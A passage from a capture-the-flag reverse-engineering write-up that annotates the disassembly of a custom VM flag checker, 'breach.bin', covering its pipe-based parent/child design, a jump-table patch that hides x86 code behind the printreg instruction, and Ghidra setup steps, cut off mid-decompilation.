<p>Looking at the difference afterwards it makes a massive difference in better understanding this disassembled code, especially when the function is so heavily used.</p>

<table>
<tr>
<td>Before</td>
<td>After</td>
</tr>
<tr>
<td>
<pre>
mov r8, 0x16
mov r9, rexe
mov r0, 0x6060
add r9, r0
call FUNC_2353
</pre>
</td>
<td>
<pre>
mov r8, 0x16
mov r9, rexe
mov r0, 0x6060
add r9, r0
call syscall ; SYS_pipe
</pre>
</td>
</tr>
</table>

<h3 id="walking-through-the-code">Walking through the code</h3>

<p>Let’s go back to this post-<code class="language-plaintext highlighter-rouge">init</code> code, and hopefully we can see how clear it is now</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">call</span> <span class="n">init</span>

	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x16</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">rexe</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x6060</span> <span class="c1">// &amp;mem[0x2000]</span>
	<span class="n">add</span> <span class="n">r9</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_pipe</span>

	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x16</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">rexe</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x6068</span> <span class="c1">// &amp;mem[0x2008]</span>
	<span class="n">add</span> <span class="n">r9</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_pipe</span>

	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x39</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_fork</span>

    <span class="c1">// If child goto child_program</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x0</span>
	<span class="n">jumpeq</span> <span class="n">r8</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">child_program</span> <span class="c1">// Was LAB_19e</span>

    <span class="c1">// If parent goto parent_program</span>
	<span class="n">jump</span> <span class="n">parent_program</span> <span class="c1">// Was LAB_126</span>
</code></pre></div></div>

<p>Looking at both <code class="language-plaintext highlighter-rouge">child_program</code> and <code class="language-plaintext highlighter-rouge">parent_program</code> they both call <code class="language-plaintext highlighter-rouge">FUNC_2093</code> with what a look like a paremter in <code class="language-plaintext highlighter-rouge">r8</code> so let’s take a look at it</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">FUNC_2093:</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r8</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0xffffffff</span>
	<span class="n">and</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x3</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_close</span>

	<span class="n">ret</span>
</code></pre></div></div>

<p>It looks like this dereferences a pointer then calls <code class="language-plaintext highlighter-rouge">close</code> on it, just below this we can see <code class="language-plaintext highlighter-rouge">FUNC_20da</code> does the same thing except it has the file descriptor in <code class="language-plaintext highlighter-rouge">r8</code>, so they can be renamed to <code class="language-plaintext highlighter-rouge">close_ptr</code> and <code class="language-plaintext highlighter-rouge">close</code></p>

<h3 id="follwoing-the-parent-path">Follwoing the parent path</h3>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">parent_program:</span>
    <span class="c1">// Close the first pipe in the pipes at 0x2000</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x2000</span>
	<span class="n">call</span> <span class="n">close_ptr</span>

    <span class="c1">// Close the second pipe in the pipes stored at 0x2008</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x200c</span>
	<span class="n">call</span> <span class="n">close_ptr</span>

	<span class="n">call</span> <span class="n">init_seccomp</span> <span class="c1">// Was FUNC_223d</span>

	<span class="n">jump</span> <span class="n">parent_program_cont</span> <span class="c1">// Was LAB_1dbd</span>
</code></pre></div></div>

<p>I won’t dig into the <code class="language-plaintext highlighter-rouge">init_seccomp</code> as it’s not necessary to solve this, when treating this as a pwn challenge for contaminated CTF (reuses this binary) it might be become more relevant.</p>

<p>Now the juice of it is primarily in <code class="language-plaintext highlighter-rouge">parent_program_cont</code></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">parent_program_cont:</span>
    <span class="c1">// Get the second fd from the first pipe and store it in mem[0x2010]</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2004</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0xffffffff</span>
	<span class="n">and</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0x2010</span>
	<span class="n">store</span> <span class="n">mem</span><span class="p">[</span><span class="n">r1</span><span class="p">],</span> <span class="n">r0</span>

    <span class="c1">// Get the first fd in the second pipe and store it in mem[0x2018]</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2008</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0xffffffff</span>
	<span class="n">and</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0x2018</span>
	<span class="n">store</span> <span class="n">mem</span><span class="p">[</span><span class="n">r1</span><span class="p">],</span> <span class="n">r0</span>

    <span class="c1">// Get 'rom' address (0x140e0 is bytecode pointer)</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x140e0</span>
	<span class="n">add</span> <span class="n">r8</span><span class="p">,</span> <span class="n">rexe</span>
	<span class="n">call</span> <span class="n">read_ptr</span> <span class="c1">// was FUNC_23cb</span>

    <span class="c1">// Store the rom address in mem[0x2020]</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0x2020</span>
	<span class="n">store</span> <span class="n">mem</span><span class="p">[</span><span class="n">r1</span><span class="p">],</span> <span class="n">r8</span>

<span class="n">get_flag</span><span class="o">:</span> <span class="c1">// was LAB_1e34</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="n">DAT_2bf6</span> <span class="p">;</span> <span class="mh">0x2bf6</span> <span class="c1">// "Flag:"</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">DAT_2bfc</span> <span class="p">;</span> <span class="mh">0x2bfc</span> <span class="c1">// End of "Flag:" ... Start of "Checking"</span>
	<span class="n">call</span> <span class="n">write_stdout</span> <span class="c1">// was FUNC_2463</span>

	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x0</span> <span class="c1">// SYS_read</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="mh">0x0</span> <span class="c1">// fd = stdin</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2020</span>
	<span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span> <span class="c1">// buf = rom address</span>
	<span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="mh">0x60</span> <span class="c1">// count</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_read</span>

    <span class="c1">// If one byte was written (aka new line) then exit</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x1</span>
	<span class="n">jumpeq</span> <span class="n">r8</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">exit_parent</span> <span class="c1">// LAB_2085</span>

    <span class="c1">// Store the number of bytes written into mem[0x2028]</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0x2028</span>
	<span class="n">store</span> <span class="n">mem</span><span class="p">[</span><span class="n">r1</span><span class="p">],</span> <span class="n">r8</span>

    <span class="c1">/// send a count of th ebytes the user entered</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x1</span> <span class="c1">// SYS_write</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2010</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span> <span class="c1">// fd = second fd of first pipe</span>
	<span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">rexe</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x6088</span>
	<span class="n">add</span> <span class="n">r10</span><span class="p">,</span> <span class="n">r0</span> <span class="c1">// buf = &amp;mem[0x2028] (number of bytes written)</span>
	<span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="mh">0x8</span> <span class="c1">// size = 0x8</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_write</span>

    <span class="c1">/// send the bytes the user entered</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x1</span> <span class="c1">// SYS_write</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2010</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span> <span class="c1">// fd = second fd of first pipe</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2020</span>
	<span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span> <span class="c1">// buf = rom address (where the flag was written)</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0x2028</span>
	<span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r1</span><span class="p">]</span> <span class="c1">// size = number of bytes read</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_write</span>

    <span class="c1">// Write "Checking...."</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="n">DAT_2bfc</span> <span class="p">;</span> <span class="mh">0x2bfc</span> <span class="c1">// "Checking..."</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">DAT_2c08</span> <span class="p">;</span> <span class="mh">0x2c08</span> <span class="c1">// end of "Checking..."</span>
	<span class="n">call</span> <span class="n">write_stdout</span> <span class="c1">// was FUNC_2463</span>

    <span class="c1">/// read a byte back from the user</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x0</span> <span class="c1">// SYS_read</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2018</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span> <span class="c1">// fd = first fd in the second pipe</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2020</span>
	<span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span> <span class="c1">// buf = rom address</span>
	<span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="mh">0x1</span> <span class="c1">// size = 1</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_read</span>

    <span class="c1">/// read from the start of the rom address</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2020</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">call</span> <span class="n">read_ptr</span> <span class="c1">// was FUNC_23cb</span>

    <span class="c1">// Cast the read to a byte and check if it's one</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0xff</span>
	<span class="n">and</span> <span class="n">r8</span><span class="p">,</span> <span class="n">r0</span>

    <span class="c1">// If the result was 1 then </span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x1</span>
	<span class="n">jumpeq</span> <span class="n">r8</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">LAB_2054</span>

	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="n">DAT_2c08</span> <span class="p">;</span> <span class="mh">0x2c08</span> <span class="c1">// "Wrong"</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">DAT_2c0f</span> <span class="p">;</span> <span class="mh">0x2c0f</span>
	<span class="n">call</span> <span class="n">write_stdout</span> <span class="c1">// was FUNC_2463</span>

	<span class="n">jump</span> <span class="n">get_flag</span> <span class="c1">// was LAB_1e34</span>

<span class="n">LAB_2054</span><span class="o">:</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="n">DAT_2c0f</span> <span class="p">;</span> <span class="mh">0x2c0f</span> <span class="c1">// "Correct!"</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="mh">0x2c18</span>
	<span class="n">call</span> <span class="n">write_stdout</span> <span class="c1">// was FUNC_2463</span>

<span class="n">LAB_2085</span><span class="o">:</span>
	<span class="n">ret</span>
</code></pre></div></div>

<p>So from this we can see that it reads and writes between pipes which the child is going to be using to validate and will send back 1 when it is a valid flag.</p>

<h3 id="following-the-child-path">Following the child path</h3>

<p>We can see up-front that like the parent it closes the other half of the pipe fd’s and also closes stdin and stdout</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">child_program:</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x2004</span>
	<span class="n">call</span> <span class="n">close_ptr</span>

	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x2008</span>
	<span class="n">call</span> <span class="n">close_ptr</span>

	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x0</span>
	<span class="n">call</span> <span class="n">close</span>

	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x1</span>
	<span class="n">call</span> <span class="n">close</span>

	<span class="n">jump</span> <span class="n">child_program_cont</span> <span class="c1">// was LAB_375</span>
</code></pre></div></div>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">child_program_cont:</span>
    <span class="c1">// Get the second fd from the second pipe and store it in mem[0x2010]</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x200c</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0xffffffff</span>
	<span class="n">and</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0x2010</span>
	<span class="n">store</span> <span class="n">mem</span><span class="p">[</span><span class="n">r1</span><span class="p">],</span> <span class="n">r0</span>

    <span class="c1">// Get the first fd from the first pipe and store it in mem[0x2018]</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2000</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0xffffffff</span>
	<span class="n">and</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0x2018</span>
	<span class="n">store</span> <span class="n">mem</span><span class="p">[</span><span class="n">r1</span><span class="p">],</span> <span class="n">r0</span>

    <span class="c1">// Get 'rom' address (0x140e0 is bytecode pointer)</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x140e0</span>
	<span class="n">add</span> <span class="n">r8</span><span class="p">,</span> <span class="n">rexe</span>
	<span class="n">call</span> <span class="n">read_ptr</span>

    <span class="c1">// Store the address of the 'rom' pointer in mem[0x2020]</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0x2020</span>
	<span class="n">store</span> <span class="n">mem</span><span class="p">[</span><span class="n">r1</span><span class="p">],</span> <span class="n">r8</span>

	<span class="n">call</span> <span class="n">FUNC_247</span>

    <span class="p">...</span>
</code></pre></div></div>

<p>Before going too deep down this path there is a very important function involved here <code class="language-plaintext highlighter-rouge">FUNC_247</code> which will change what the printreg instructions end up doing</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">patch_printreg:</span> <span class="c1">// was FUNC_247</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0xa</span> <span class="c1">// SYS_mprotect</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="mh">0x1000</span>
	<span class="n">add</span> <span class="n">r9</span><span class="p">,</span> <span class="n">rexe</span>    <span class="c1">// start = exe+0x1000</span>
	<span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="mh">0x2000</span> <span class="c1">// len = 0x2000</span>
	<span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="mh">0x7</span>    <span class="c1">// prot = PROT_READ | PROT_WRITE | PROT_EXEC</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_mprotect</span>

    <span class="c1">// Calculate the absolute address of the DAT_2a23 in memory and store it in r9</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x2020</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">DAT_2a23</span> <span class="p">;</span> <span class="mh">0x2a23</span>
	<span class="n">add</span> <span class="n">r1</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">r1</span>

    <span class="c1">// Address to store the data, exe+0x1a00 is just after .text and before .rodata</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x1a00</span>
	<span class="n">add</span> <span class="n">r8</span><span class="p">,</span> <span class="n">rexe</span> 

    <span class="c1">// Calculate the size of DAT_2a23 and divide it by 8 (&gt;&gt; 3)</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="n">str_flag</span> <span class="p">;</span> <span class="mh">0x2bf6</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">DAT_2a23</span> <span class="p">;</span> <span class="mh">0x2a23</span>
	<span class="n">sub</span> <span class="n">r1</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x3</span>
	<span class="n">shr</span> <span class="n">r1</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">r1</span>

    <span class="c1">// dst/r8=exe+0x1a00</span>
    <span class="c1">// src/r9=absolute address of DAT_2a23</span>
    <span class="c1">// size/r10=sizeof(DAT_2a23)/8</span>
	<span class="n">call</span> <span class="n">memcpy_qword</span> <span class="c1">// was FUNC_2112 </span>

    <span class="c1">// Overwrite the instruction switch jump table entry for printreg(10)</span>
    <span class="c1">// with the address of 0x1a00, because this writes a pointer size and</span>
    <span class="c1">// the jump table is int it must write two entries so it writes to</span>
    <span class="c1">// the entry of 9 and 10 simultanously keeping the value of 9 unchanged</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="mh">0xfffff9bcfffff7c8</span>
	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0x2068</span>
	<span class="n">add</span> <span class="n">r8</span><span class="p">,</span> <span class="n">rexe</span>
	<span class="n">call</span> <span class="n">write_ptr</span>

	<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span> <span class="mh">0xa</span> <span class="c1">// SYS_mprotect</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="mh">0x1000</span>
	<span class="n">add</span> <span class="n">r9</span><span class="p">,</span> <span class="n">rexe</span>    <span class="c1">// start</span>
	<span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="mh">0x2000</span> <span class="c1">// length</span>
	<span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="mh">0x5</span> <span class="c1">// proto = PROTO_READ | PROTO_EXEC</span>
	<span class="n">call</span> <span class="n">syscall</span> <span class="p">;</span> <span class="n">SYS_mprotect</span>

	<span class="n">ret</span>
</code></pre></div></div>

<p>The rabbit hole deepens as you can see, this changes what the <code class="language-plaintext highlighter-rouge">printreg</code> instruction does to be instead what’s hidden in the assembly of <code class="language-plaintext highlighter-rouge">DAT_2a23</code>.</p>

<h4 id="examining-the-printreg-patching">Examining the printreg patching</h4>

<p>In order to more easily understand what the code in <code class="language-plaintext highlighter-rouge">DAT_2a23</code> does let’s open <code class="language-plaintext highlighter-rouge">breach.bin</code> in Ghidra set the language to <code class="language-plaintext highlighter-rouge">x86:LE:default:gcc</code>, don’t let it analyze the code, we know exactly what we want and from where</p>

<p>The important code we want is at 0x2a23 and we want it to be treated as though it’s at the address 0x101a00 to more easily relate it to the executable code.</p>

<p>In order to do this in Window -&gt; Memory Map you can click “Move” and provide <code class="language-plaintext highlighter-rouge">0xFEFDD</code> for the start address which is <code class="language-plaintext highlighter-rouge">0x101a00 - 0x2a23</code>.</p>

<p>In order to make things a little easier we will also add an uninitialized block that will cover enough space for us to define existing variables and types so I create a new block called <code class="language-plaintext highlighter-rouge">postblock</code> which starts at <code class="language-plaintext highlighter-rouge">0x101bf5</code> and has a length of <code class="language-plaintext highlighter-rouge">0x10000</code></p>

<p>After this is adjusted now you can go to the address of <code class="language-plaintext highlighter-rouge">0x00101a00</code> which should match the file <code class="language-plaintext highlighter-rouge">0x2a23</code> and press D to disassemble, and we can start seeing what it does.</p>

<p>We can see that it starts with</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mo">00101</span><span class="n">a00</span>     <span class="n">CALL</span>       <span class="n">FUN_00101a0a</span>
<span class="mo">00101</span><span class="n">a05</span>     <span class="n">JMP</span>        <span class="n">LAB_0010193b</span>
</code></pre></div></div>

<p>If you look at <code class="language-plaintext highlighter-rouge">0x0010193b</code> in breach you’ll see it’s the continuation of the loop, so <code class="language-plaintext highlighter-rouge">FUN_00101a0a</code> is the core of this.</p>

<p>Let’s do some initial house keeping and setup some types to match the binary
| address | name | type |
| ——- | —- | —- |
| 00104040 | inst_offset | long |
| 001140e0 | bytecode | byte* |
| 00104060 | mem | long[0x2000] (byte[65536] but we bypass that) |
| 00114060 | registers | long[16] |</p>

<p>Now let’s look at how the decompilation looks</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">FUN_00101a0a</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">byte</span> <span class="n">bVar1</span><span class="p">;</span>
  <span class="n">ulong</span> <span class="n">in_RCX</span><span class="p">;</span>
  <span class="n">byte</span> <span class="n">bVar2</span><span class="p">;</span>
  
  <span class="n">bVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">bytecode</span> <span class="o">+</span> <span class="n">inst_offet</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
  <span class="n">bVar2</span> <span class="o">=</span> <span class="n">bytecode</span><span class="p">[</span><span class="n">inst_offet</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">mem</span> <span class="o">+</span> <span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">])</span> <span class="o">=</span>
         <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">registers</span> <span class="o">+</span> <span class="p">(</span><span class="n">in_RCX</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span> <span class="o">|</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">byte</span><span class="p">)(</span><span class="n">bVar1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">))</span>
    <span class="p">;</span>
    <span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">mem</span> <span class="o">+</span> <span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">])</span> <span class="o">=</span> <span class="n">bVar1</span><span class="p">;</span>
    <span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405e</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]]</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405f</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]]</span> <span class="o">+</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405e</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]];</span>
    <span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]</span> <span class="o">+=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405e</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]]</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405f</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]]</span> <span class="o">*</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405e</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]];</span>
    <span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]</span> <span class="o">+=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405e</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]]</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405f</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]]</span> <span class="o">^</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010405e</span><span class="p">)[</span><span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]];</span>
    <span class="n">mem</span><span class="p">[</span><span class="mi">1536</span><span class="p">]</span> <span class="o">+=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
